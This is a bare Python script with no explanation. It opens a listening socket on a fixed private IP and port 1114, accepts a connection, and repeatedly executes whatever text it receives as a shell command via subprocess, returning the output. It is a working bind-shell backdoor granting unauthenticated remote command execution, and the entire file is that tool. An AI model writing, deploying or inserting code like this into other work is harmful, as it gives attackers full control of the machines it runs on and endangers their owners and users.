import socket
import os
import subprocess

s = socket.socket()
ip="192.168.43.202"
port=1114
s.bind( (ip,port) )
s.listen()

client_session , client_address = s.accept()

while True:
	data = client_session.recv(20)
	cmd = data.decode()
	output = subprocess.getoutput(cmd)
	print(output)
	output = output.encode()
	client_session.send(output)
